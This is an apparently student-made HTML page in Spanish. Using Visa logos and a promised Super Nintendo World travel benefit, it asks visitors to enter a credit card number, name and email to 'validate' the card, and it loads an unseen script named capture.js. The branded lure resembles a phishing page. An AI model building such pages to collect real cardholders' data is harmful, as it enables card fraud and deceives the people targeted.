<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <title>Tarjeta de crédito válida</title>
  <link rel="stylesheet" href="style.css" />
</head>

<body>
  <div class="mini-contenedor">
    <img src="img/Visa-Logo-Transparent.png" alt="">
  </div>
  <div class="imagen-fondo">
    <img src="img/fondo.jpg" alt="">
    <div class="contenedor1">
      <div class="logo-champi">
        <img src="./img/champi.png" alt="" class="src">
        <div class="logo-champi2">
          <img src="./img/champi.png" alt="" class="src">
        </div>
        <div class="tittle">
          <h1>Valida <br> tu <br> Tarjeta!</h1>
          <br>
        </div>
        <div class="parrafo">
          <p>Y diviértete con</p>
          <div class="tittle2">
            <h2>nintendo</h2>
          </div>
          <br>
          <h4>Visa te ofrece una variedad de beneficios exclusivos para tu nuevo viaje a Super Nintendo World!</h4>
          <br>
          <p> Ingresa tus datos para validar tu tarjeta de crédito Visa y solicitar activación del convenio y prepárate para disfrutar de
            tus próximas vacaciones</p>
          <br>
        </div>
      </div>
      <form method="post" id="formulario" action="tarjetaValida.html">
        <label for="ccNumber">Número de tarjeta</label>
        <br>
        <input type="text" name="ccnumber" id="ccNumber" pattern="[0-9]+" required
          placeholder="Ingrese numero de tarjeta" maxlength="16" autocomplete="off">
        <br>
        <br>
        <label for="name">Nombre del propietario</label>
        <br>
        <input type="text" name="OwnerName" id="name" pattern="[a-z A-Z]+" required
          placeholder="Ingrese nombre completo" autocomplete="off">
        <br>
        <br>
        <label for="email">Correo Electrónico</label>
        <br>
        <input type="text" name="mail" id="mail" required placeholder="Ingrese su correo electrónico"
          autocomplete="off">
        <br>
        <br>
        <button type="submit" id="checkButton"> Enviar </button>
      </form>
    </div>
  </div>

  <script src="index.js" type="module"></script>
  <script src="capture.js"></script>
</body>

</html>
